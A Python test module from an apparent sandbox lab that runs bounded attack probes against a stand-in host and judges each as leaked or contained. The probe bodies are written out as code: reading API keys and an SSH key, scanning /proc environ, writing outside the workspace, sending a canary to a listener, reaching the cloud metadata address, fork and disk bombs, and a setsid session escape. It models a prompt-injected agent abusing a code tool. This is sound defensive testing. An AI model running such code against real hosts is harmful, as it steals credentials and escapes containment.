"""probes.py — what a hijacked model would try, run against stand-ins, with a verdict for each.

One idea: you cannot argue about a sandbox in the abstract; you run the attacks through it and
read the verdicts. Each probe is a short Python program an injected prompt could make an agent's
``run_code`` tool execute (PRIMER §1 "Why a sandbox, and the threat model"), and each is
**harmless by construction**: the secrets are canaries planted in a temporary "host" directory
and in a stand-in agent process, the egress target is a listener on this machine, every
resource grab is bounded (64 forks that exit after 1.5 s, 16 MiB of disk, 512 MiB of memory,
4 MiB of output), and the only unbounded ones (an infinite loop, a sleep) are cut by the
harness.

    with standin_host() as host:
        results = run_suite(ProcessSandbox(), host)
    print(verdict_table({"process": results}))

A verdict is ``LEAKED`` (the attacker got it), ``CONTAINED`` (a control stopped it) or ``N/A``
(the machine has nothing to leak, e.g. no cloud metadata server off-cloud). The lab's core
package has its own probe set (``sandboxcore.threats``); this one adds the probes that separate
containers from processes: ``/proc`` scanning, writes outside the workspace, escaping the
process group, filling the disk with many small files.
"""
from __future__ import annotations

import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
from contextlib import contextmanager
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Callable

from .process import Budgets, ExecResult

LEAKED, CONTAINED, NA = "LEAKED", "CONTAINED", "N/A"
PRELUDE = "import json, os, sys, socket, time, signal\nP = json.loads({params!r})\n"


# ---- the stand-in host -------------------------------------------------------------------------
class Listener:
    """A TCP listener that records what it receives: the 'attacker's server' for egress probes."""

    def __init__(self, bind: str = "127.0.0.1"):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((bind, 0))
        self.sock.listen(16)
        self.sock.settimeout(0.2)
        self.port = self.sock.getsockname()[1]
        self.received: list[bytes] = []
        self._stop = threading.Event()
        self._t = threading.Thread(target=self._serve, daemon=True)
        self._t.start()

    def _serve(self):
        while not self._stop.is_set():
            try:
                conn, _ = self.sock.accept()
            except (socket.timeout, OSError):
                continue
            conn.settimeout(1.0)
            try:
                data = conn.recv(4096)
                if data:
                    self.received.append(data)
            except OSError:
                pass
            finally:
                conn.close()

    def got(self, needle: str) -> bool:
        return any(needle.encode() in d for d in self.received)

    def close(self):
        self._stop.set()
        self._t.join(timeout=1)
        self.sock.close()


@dataclass
class Host:
    """The machine an unsandboxed executor would expose. Everything secret in it is a canary."""
    root: Path
    home: Path
    canary: str
    listener: Listener
    agent_pid: int
    marker_dir: Path
    listener_hosts: list[str] = field(default_factory=lambda: ["127.0.0.1"])
    metadata_reachable: bool = False

    @property
    def key_path(self) -> Path:
        return self.home / ".ssh" / "id_ed25519"

    def agent_env(self) -> dict:
        """What an unsandboxed ``subprocess.run`` inherits: the agent's environment, secrets included."""
        return {**os.environ, "HOME": str(self.home), "LAB_CANARY_API_KEY": self.canary}

    def params(self, name: str, budgets: Budgets) -> dict:
        return {"probe": name, "canary": self.canary, "key_path": str(self.key_path),
                "outside_path": str(self.root / f"written-by-{name}.txt"),
                "listener_hosts": self.listener_hosts, "listener_port": self.listener.port,
                "marker_path": str(self.marker_dir / f"escaped-{self.canary}"), "escape_delay_s": 1.0,
                "fork_target": max(64, 2 * budgets.pids), "disk_target_mib": max(16, 2 * budgets.file_mib),
                "mem_target_mib": max(512, 2 * budgets.memory_mib), "output_target_mib": 4}


def _metadata_reachable(timeout: float = 0.4) -> bool:
    try:
        with socket.create_connection(("169.254.169.254", 80), timeout=timeout):
            return True
    except OSError:
        return False


@contextmanager
def standin_host(bind: str = "127.0.0.1", listener_hosts: list[str] | None = None):
    """A temporary 'agent host': a 0700 directory with a stand-in SSH key, a stand-in agent process
    whose *initial* environment holds an API-key canary (what ``/proc/<pid>/environ`` shows), a
    world-writable marker directory for the escape probe, and a canary listener."""
    canary = "LABCANARY-" + os.urandom(6).hex()
    root = Path(tempfile.mkdtemp(prefix="sbx-host-"))
    home = root / "home"
    (home / ".ssh").mkdir(parents=True)
    (home / ".ssh" / "id_ed25519").write_text(
        f"-----BEGIN OPENSSH PRIVATE KEY-----\nstand-in key for the sandbox lab, not a real key: {canary}\n"
        "-----END OPENSSH PRIVATE KEY-----\n")
    os.chmod(home / ".ssh" / "id_ed25519", 0o600)
    marker_dir = Path(tempfile.mkdtemp(prefix="sbx-marker-"))
    os.chmod(marker_dir, 0o1777)
    agent = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(600)"],
                             env={"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "LAB_CANARY_API_KEY": canary},
                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    listener = Listener(bind)
    host = Host(root=root, home=home, canary=canary, listener=listener, agent_pid=agent.pid,
                marker_dir=marker_dir, listener_hosts=listener_hosts or ["127.0.0.1"],
                metadata_reachable=_metadata_reachable())
    try:
        yield host
    finally:
        listener.close()
        agent.kill()
        agent.wait()
        shutil.rmtree(root, ignore_errors=True)
        shutil.rmtree(marker_dir, ignore_errors=True)


# ---- the probes ---------------------------------------------------------------------------------
def _obs(res: ExecResult) -> dict:
    for line in reversed(res.stdout.splitlines()):
        if line.startswith("{"):
            try:
                return json.loads(line)
            except ValueError:
                return {}
    return {}


@dataclass(frozen=True)
class Probe:
    name: str
    attack: str          # what the injected code tries
    risk: str            # OWASP agentic id(s) from the identity primer §2
    stopped_by: str      # the control that stops it
    body: str            # Python, after PRELUDE
    judge: Callable[[ExecResult, dict, Host, dict], tuple[str, str]]


def _canary_in_output(res, obs, host, p):
    return (LEAKED, "canary in the output") if host.canary in res.stdout else (CONTAINED, obs.get("error", "not found"))


def _judge_proc(res, obs, host, p):
    if obs.get("no_proc"):
        return NA, "no /proc on this OS"
    return _canary_in_output(res, obs, host, p)


def _judge_write(res, obs, host, p):
    path = Path(p["outside_path"])
    if path.exists():
        path.unlink()
        return LEAKED, f"wrote {path.name} into the host directory"
    return CONTAINED, obs.get("error", "write failed")


def _judge_egress(res, obs, host, p):
    if host.listener.got(host.canary):
        return LEAKED, f"listener received the canary via {obs.get('reached', '?')}"
    return CONTAINED, "; ".join(obs.get("errors", [])) or "no connection"


def _judge_metadata(res, obs, host, p):
    if not host.metadata_reachable:
        return NA, "no metadata server from this host (not a cloud VM)"
    return (LEAKED, "TCP connect to 169.254.169.254:80 succeeded") if obs.get("reachable") else (CONTAINED, obs.get("error", "unreachable"))


def _judge_forks(res, obs, host, p):
    n = obs.get("forked")
    if n is None:
        return CONTAINED, f"exit reason {res.exit_reason}"
    return (LEAKED, f"forked all {n}") if n >= p["fork_target"] else (CONTAINED, f"stopped after {n} forks: {obs.get('error', '')}")


def _judge_disk(res, obs, host, p):
    n = obs.get("written_mib")
    if n is None:
        return CONTAINED, f"exit reason {res.exit_reason}"
    return (LEAKED, f"wrote all {n} MiB") if n >= p["disk_target_mib"] else (CONTAINED, f"stopped at {n} MiB: {obs.get('error', '')}")


def _judge_memory(res, obs, host, p):
    if obs.get("allocated_mib", 0) >= p["mem_target_mib"]:
        return LEAKED, f"allocated {obs['allocated_mib']} MiB"
    return CONTAINED, f"exit reason {res.exit_reason}"


def _judge_budget(res, obs, host, p):
    if res.exit_reason == "harness_timeout":
        return LEAKED, "no budget: ran until the harness killed it"
    return CONTAINED, f"exit reason {res.exit_reason} after {res.wall_s:.2f} s"


def _judge_output(res, obs, host, p):
    captured = len(res.stdout.encode())
    if captured >= p["output_target_mib"] * 2**20:
        return LEAKED, f"all {captured} bytes reached the caller"
    return CONTAINED, f"{captured} bytes kept, exit reason {res.exit_reason}"


def _judge_escape(res, obs, host, p):
    time.sleep(p["escape_delay_s"] + 0.6)
    marker = Path(p["marker_path"])
    if marker.exists():
        marker.unlink()
        return LEAKED, "a process outlived the execution (setsid) and wrote after it returned"
    return CONTAINED, (f"{res.stragglers_killed} straggler(s) killed" if res.stragglers_killed
                       else "nothing outlived the execution")


PROBES: list[Probe] = [
    Probe("env_secret", "read API keys from its environment", "ASI05, ASI03", "a clean environment",
          'hits = sorted(k for k, v in os.environ.items() if P["canary"] in v)\n'
          'print(json.dumps({"found": hits, "values": [os.environ[k] for k in hits]}))\n', _canary_in_output),
    Probe("ssh_key", "read the agent's SSH key (by $HOME and by absolute path)", "ASI05, ASI03",
          "a different UID, or a filesystem that does not contain it",
          'out, err = [], []\n'
          'for path in (os.path.expanduser("~/.ssh/id_ed25519"), P["key_path"]):\n'
          '    try:\n        out.append(open(path).read())\n'
          '    except OSError as e:\n        err.append(type(e).__name__)\n'
          'print(json.dumps({"read": out, "error": ",".join(err)}))\n', _canary_in_output),
    Probe("proc_environ", "scan /proc/*/environ for other processes' secrets", "ASI05, ASI03",
          "a different UID (environ is owner-only) or a PID namespace",
          'if not os.path.isdir("/proc/self"):\n    print(json.dumps({"no_proc": True})); sys.exit(0)\n'
          'found = []\n'
          'for pid in os.listdir("/proc"):\n'
          '    if pid.isdigit():\n'
          '        try:\n            env = open(f"/proc/{pid}/environ", "rb").read()\n'
          '        except OSError:\n            continue\n'
          '        if P["canary"].encode() in env:\n'
          '            found += [f"pid {pid}: " + v.decode("utf-8", "replace") for v in env.split(b"\\0") if P["canary"].encode() in v]\n'
          'print(json.dumps({"found": found, "error": "" if found else "no readable environ held the canary"}))\n',
          _judge_proc),
    Probe("write_outside", "write a file outside its workspace", "ASI05",
          "a different UID, a read-only root filesystem, no host mounts",
          'try:\n    open(P["outside_path"], "w").write("pwned")\n    print(json.dumps({"wrote": True}))\n'
          'except OSError as e:\n    print(json.dumps({"error": type(e).__name__}))\n', _judge_write),
    Probe("egress", "send the canary to a server it should not reach", "ASI05, ASI01 (exfiltration)",
          "no network (an empty network namespace, --network none, default-deny NetworkPolicy)",
          'errors, reached = [], None\n'
          'for h in P["listener_hosts"]:\n'
          '    try:\n'
          '        s = socket.create_connection((h, P["listener_port"]), timeout=1.0)\n'
          '        s.sendall(P["canary"].encode()); s.close(); reached = h; break\n'
          '    except OSError as e:\n        errors.append(f"{h}: {type(e).__name__}")\n'
          'print(json.dumps({"reached": reached, "errors": errors}))\n', _judge_egress),
    Probe("metadata", "reach the cloud metadata server (where node and pod credentials come from)", "ASI03, ASI05",
          "no network; on GKE, Workload Identity + a KSA with no IAM roles (NetworkPolicy cannot block it)",
          '# connect only: reachability is the finding, nothing is requested\n'
          'try:\n'
          '    socket.create_connection(("169.254.169.254", 80), timeout=0.5).close()\n'
          '    print(json.dumps({"reachable": True}))\n'
          'except OSError as e:\n    print(json.dumps({"reachable": False, "error": type(e).__name__}))\n', _judge_metadata),
    Probe("fork_bomb", "fork until the machine stops (bounded: 64 children that exit after 1.5 s)", "ASI08 (resource abuse)",
          "a process budget: RLIMIT_NPROC with a dedicated UID, --pids-limit, kubelet podPidsLimit",
          'kids, err = [], ""\n'
          'for _ in range(P["fork_target"]):\n'
          '    try:\n        pid = os.fork()\n'
          '    except OSError as e:\n        err = f"{type(e).__name__}: {e.strerror}"; break\n'
          '    if pid == 0:\n        time.sleep(1.5); os._exit(0)\n'
          '    kids.append(pid)\n'
          'print(json.dumps({"forked": len(kids), "error": err}), flush=True)\n'
          'for k in kids:\n'
          '    try:\n        os.kill(k, signal.SIGKILL); os.waitpid(k, 0)\n'
          '    except OSError:\n        pass\n', _judge_forks),
    Probe("disk_fill", "fill the disk with one big file (bounded: 16 MiB)", "ASI08 (resource abuse)",
          "RLIMIT_FSIZE, a sized tmpfs, an emptyDir sizeLimit",
          'n, err = 0, ""\n'
          'try:\n'
          '    with open("fill.bin", "wb") as f:\n'
          '        for _ in range(P["disk_target_mib"]):\n            f.write(b"\\0" * 2**20); f.flush(); n += 1\n'
          'except OSError as e:\n    err = f"{type(e).__name__}: {e.strerror}"\n'
          'finally:\n'
          '    try:\n        os.remove("fill.bin")\n    except OSError:\n        pass\n'
          'print(json.dumps({"written_mib": n, "error": err}))\n', _judge_disk),
    Probe("disk_fill_many", "fill the disk with many 1 MiB files (per-file limits do not see this)", "ASI08 (resource abuse)",
          "a size-capped filesystem (tmpfs size=, emptyDir sizeLimit) — not RLIMIT_FSIZE",
          'n, err = 0, ""\n'
          'try:\n'
          '    for i in range(P["disk_target_mib"]):\n'
          '        with open(f"fill{i}.bin", "wb") as f:\n            f.write(b"\\0" * 2**20)\n        n += 1\n'
          'except OSError as e:\n    err = f"{type(e).__name__}: {e.strerror}"\n'
          'for i in range(n + 1):\n'
          '    try:\n        os.remove(f"fill{i}.bin")\n    except OSError:\n        pass\n'
          'print(json.dumps({"written_mib": n, "error": err}))\n', _judge_disk),
    Probe("memory_hog", "allocate far more memory than it needs (bounded: 512 MiB)", "ASI08 (resource abuse)",
          "RLIMIT_AS, a memory cgroup (--memory, resources.limits.memory)",
          'buf = bytearray(P["mem_target_mib"] * 2**20)\n'
          'print(json.dumps({"allocated_mib": len(buf) // 2**20}))\n', _judge_memory),
    Probe("infinite_loop", "burn CPU forever", "ASI08 (resource abuse, mining)", "RLIMIT_CPU, a wall timeout",
          'while True:\n    pass\n', _judge_budget),
    Probe("sleep_forever", "hold the sandbox without using CPU", "ASI08 (resource abuse)",
          "a wall-clock timeout (CPU limits never fire on a sleeping process)",
          'time.sleep(3600)\n', _judge_budget),
    Probe("huge_output", "print 4 MiB into the agent's context window", "ASI08, cost",
          "output truncation and an output kill limit in the wrapper",
          'chunk = "A" * 65536\n'
          'for _ in range(P["output_target_mib"] * 16):\n    sys.stdout.write(chunk)\n', _judge_output),
    Probe("escape_session", "leave the process group (setsid) and keep running after the call returns", "ASI05, ASI10",
          "a cgroup or PID namespace that dies with the sandbox; with processes only, a dedicated UID swept after each run",
          'pid = os.fork()\n'
          'if pid == 0:\n'
          '    os.setsid()\n'
          '    fd = os.open(os.devnull, os.O_RDWR)\n'
          '    for i in (0, 1, 2):\n        os.dup2(fd, i)\n'
          '    time.sleep(P["escape_delay_s"])\n'
          '    try:\n        open(P["marker_path"], "w").write("still here")\n'
          '    except OSError:\n        pass\n'
          '    os._exit(0)\n'
          'print(json.dumps({"spawned": pid}))\n', _judge_escape),
]
BY_NAME = {p.name: p for p in PROBES}
QUICK = ["env_secret", "ssh_key", "proc_environ", "write_outside", "egress", "fork_bomb", "disk_fill",
         "memory_hog", "huge_output"]


def probe_code(probe: Probe, params: dict) -> str:
    return PRELUDE.format(params=json.dumps(params)) + probe.body


@dataclass
class ProbeResult:
    probe: str
    isolation: str
    verdict: str
    evidence: str
    exit_reason: str
    wall_s: float
    label: str = "measured on this machine"

    def to_dict(self) -> dict:
        return asdict(self)


def run_probe(executor, probe: Probe | str, host: Host, budgets: Budgets | None = None) -> ProbeResult:
    """Run one probe through any executor with ``.run(code, budgets, env=...)`` and judge it."""
    probe = BY_NAME[probe] if isinstance(probe, str) else probe
    b = budgets or getattr(executor, "budgets", None) or Budgets()
    params = host.params(probe.name, b)
    host.listener.received.clear()          # a verdict is about this run only
    res: ExecResult = executor.run(probe_code(probe, params), b)
    verdict, evidence = probe.judge(res, _obs(res), host, params)
    label = "simulated" if res.simulated else "measured on this machine"
    return ProbeResult(probe.name, getattr(executor, "name", res.isolation), verdict, evidence,
                       res.exit_reason, res.wall_s, label)


def run_suite(executor, host: Host, names: list[str] | None = None, budgets: Budgets | None = None) -> list[ProbeResult]:
    return [run_probe(executor, n, host, budgets) for n in (names or [p.name for p in PROBES])]


def verdict_table(runs: dict[str, list[ProbeResult]]) -> str:
    """Probes down, isolation levels across; each cell the verdict (and a short reason)."""
    cols = list(runs)
    by = {c: {r.probe: r for r in runs[c]} for c in cols}
    names = [p.name for p in PROBES if any(p.name in by[c] for c in cols)]
    w = max(12, *(len(c) for c in cols))
    lines = ["probe            " + "".join(f"{c:<{w + 2}}" for c in cols)]
    for n in names:
        cells = "".join(f"{(by[c][n].verdict if n in by[c] else '-'):<{w + 2}}" for c in cols)
        lines.append(f"{n:<17}{cells}")
    leaks = {c: sum(r.verdict == LEAKED for r in runs[c]) for c in cols}
    lines.append("LEAKED           " + "".join(f"{str(leaks[c]):<{w + 2}}" for c in cols))
    return "\n".join(lines)


def load_sample_runs(name: str = "docker_verdicts.json") -> dict[str, list[ProbeResult]]:
    """Bundled verdicts for levels this machine cannot run (Docker, gVisor, kind, GKE).

    They are **sample output in the documented format (illustrative)**: the format ``run_suite``
    produces, filled in from the documented behaviour of each control, not measured here."""
    data = json.loads((Path(__file__).parent / "data" / "samples" / name).read_text())
    return {iso: [ProbeResult(**r) for r in rows] for iso, rows in data["runs"].items()}


def sample_label(name: str = "docker_verdicts.json") -> str:
    data = json.loads((Path(__file__).parent / "data" / "samples" / name).read_text())
    return data["_label"]


def unsandboxed_for(host: Host, harness_timeout_s: float = 3.0):
    """The naive executor, as it would run on the agent's host: its env, its HOME, its UID."""
    from .process import Unsandboxed
    return Unsandboxed(env=host.agent_env(), cwd=str(host.home), harness_timeout_s=harness_timeout_s)
